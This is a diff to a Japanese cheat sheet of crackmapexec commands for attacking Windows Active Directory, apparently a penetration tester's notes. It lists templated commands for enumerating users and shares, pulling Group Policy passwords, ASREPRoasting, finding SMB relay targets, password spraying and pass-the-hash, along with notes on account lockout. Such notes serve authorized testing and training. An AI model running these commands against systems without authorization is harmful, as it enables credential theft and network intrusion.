@@ -16,12 +16,34 @@ FTP	21
 
 //列挙
 crackmapexec smb <IP> -d <domain name> -u <user name> -p <pass> --shares #共有フォルダの列挙
+
 crackmapexec smb <IP> -d <domain name> -u <user name> -p <pass> --users #ユーザー名の列挙
+#これでリストアップしたユーザ名をコピペしてユーザ名の部分だけ抜き出す
+awk -F'\\\\' '{print $2}' users.txt | awk '{print $1}' > user.txt
+
 crackmapexec smb <IP> -d <domain name> -u <user name> -p <pass> --rid-brute #RIDによるユーザの列挙
+
 crackmapexec smb <IP> --groups #グループ列挙
+
+crackmapexec smb <network IP> --gen-relay-list output.txt # SMB署名が無効になっているすべてのホストを抽出するオプション
+
+crackmapexec smb <IP> -u <user> -p <pass> -M gpp_password (もしくは gpp_password) #GPOに記述された認証情報を取得する。古いサーバ（2003～2008）に有効
+
+crackmapexec ldap <domain> -u user.txt -p '' --asreproast output.txt #Kerberos事前認証を必要としないASREPRoast脆弱性を持つユーザーを探す
+
+crackmapexec ldap <domain> -u <user> -p '<pass>' -M user-desc -o KEYWORDS='<key word>' # ADドメイン内のすべてのユーザーを照会してその説明を取得しキーワードにヒットしたもの表示する
+
 
 //パスワードスプレー
 crackmapexec smb <IP> -d <domain name> -u <user name> -p <pass> #入手できたパスを利用する。ユーザ名やパスはリストでも可。
 # --continue-on-successを付ければずっと続けてくれる
- sudo crackmapexec smb --local-auth <network addres> -u administrator -H <hash>
-#ネットワークアドレスに対してadminのパスワードスプレー
+sudo crackmapexec smb --local-auth <network addres> -u administrator -H <hash>
+#ネットワークアドレスに対してadminのパスワードスプレー --local-authはドメインアカウントではなくローカルアカウントに対して
+#Account Lockout ThresholdがポリシーでNoneになってないとロックアウトがあるよ
+crackmapexec mssql <IP> -u nicole belkis linda patrick -p pass.txt -d . #-d .でローカルWindowsアカウントを指定できる
+
+//アカウントステータス
+緑：ユーザー名とパスワードは有効です。
+赤：ユーザー名またはパスワードが無効です。
+マゼンタ：ユーザー名とパスワードは有効ですが、認証は成功しません。
+STATUS_PASSWORD_MUST_CHANGEのステータスのアカウントはsmbpasswd -r <IP> -U <user>のコマンドで変更しよう
